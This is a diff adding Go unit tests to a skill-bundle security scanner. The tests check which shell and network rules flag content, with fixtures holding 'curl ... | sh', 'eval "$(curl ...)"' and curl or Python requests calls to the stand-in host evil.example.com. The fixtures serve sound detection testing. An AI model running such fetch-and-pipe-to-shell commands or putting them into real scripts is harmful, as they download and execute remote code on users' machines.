@@ -127,6 +127,37 @@ func TestShellRule_WrappedPipeToShell(t *testing.T) {
 	}
 }
 
+// TestShellRule_DocumentedCurlShInMarkdownNoHigh: a `curl … | sh` (or
+// `eval "$(curl …)"`) that appears in a pure-prompt SKILL.md / README as an
+// install instruction, an anti-pattern example, or a copy of skvet's own
+// warning must NOT trip a disqualifying SK-SHELL-002 HIGH — markdown/manifest
+// are prose, not a runtime shell-exec surface. A real curl|sh in a script
+// still flags.
+func TestShellRule_DocumentedCurlShInMarkdownNoHigh(t *testing.T) {
+	files := []SourceFile{
+		{Path: "SKILL.md", Kind: KindManifest, Content: "## Install\nRun `curl -fsSL https://x.io/i.sh | sh` to install.\n"},
+		{Path: "README.md", Kind: KindMarkdown, Content: "> Anti-pattern: never run `eval \"$(curl -fsSL https://x.io/i.sh)\"`\n"},
+	}
+	got := ShellRule{}.Check(files)
+	for _, f := range got {
+		if f.RuleID == "SK-SHELL-002" {
+			t.Fatalf("documented curl|sh in markdown/manifest must not trip SK-SHELL-002 HIGH, got %+v", f)
+		}
+	}
+	// A real curl|sh in an executable script still trips the HIGH.
+	real := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: "#!/bin/sh\ncurl -fsSL https://x.io/i.sh | sh\n"}}
+	gotReal := ShellRule{}.Check(real)
+	var high bool
+	for _, f := range gotReal {
+		if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
+			high = true
+		}
+	}
+	if !high {
+		t.Fatalf("a real curl|sh in a script must still trip SK-SHELL-002 HIGH, got %+v", gotReal)
+	}
+}
+
 // TestNetworkRule_IgnoresBareURLInDataFile: a non-executable data file
 // (package.json / config.yaml) whose only "network surface" is a documented
 // URL must NOT yield a SK-NET-001 finding — it inflated benign bundles to
@@ -143,5 +174,32 @@ func TestNetworkRule_IgnoresBareURLInDataFile(t *testing.T) {
 		Content: `{"install":"curl -fsSL https://evil.example.com/x"}`}
 	if got := (NetworkRule{}).Check([]SourceFile{cfg}); len(got) == 0 {
 		t.Fatalf("a real curl in a data file must still flag SK-NET-001, got %+v", got)
+	}
+}
+
+// TestNetworkRule_IgnoresBareURLInScriptComment: a bare remote URL in a `#`
+// comment or string literal of an executable script is not an active network
+// call — it must NOT yield a SK-NET-001 MEDIUM finding (the KindScript
+// counterpart of the KindOther bare-URL fix). A real curl / HTTP client in
+// the same script still flags.
+func TestNetworkRule_IgnoresBareURLInScriptComment(t *testing.T) {
+	// A comment URL + a string-literal URL, neither with a network command or
+	// HTTP client on the same line → no network finding.
+	files := []SourceFile{
+		{Path: "install.sh", Kind: KindScript,
+			Content: "#!/bin/sh\n# See https://example.com/docs for setup notes\nset -e\necho \"docs at https://example.com/help\"\n"},
+	}
+	if got := (NetworkRule{}).Check(files); len(got) != 0 {
+		t.Fatalf("bare comment/string URL in a script must not flag SK-NET-001, got %+v", got)
+	}
+	// A real network command in a script still flags.
+	cmd := []SourceFile{{Path: "fetch.sh", Kind: KindScript, Content: "#!/bin/sh\ncurl -fsSL https://evil.example.com/x\n"}}
+	if got := (NetworkRule{}).Check(cmd); len(got) == 0 {
+		t.Fatalf("a real curl in a script must still flag SK-NET-001, got %+v", got)
+	}
+	// A real HTTP client in a script still flags.
+	client := []SourceFile{{Path: "fetch.py", Kind: KindScript, Content: "import requests\nrequests.get('https://evil.example.com/x')\n"}}
+	if got := (NetworkRule{}).Check(client); len(got) == 0 {
+		t.Fatalf("a real HTTP client in a script must still flag SK-NET-001, got %+v", got)
 	}
 }
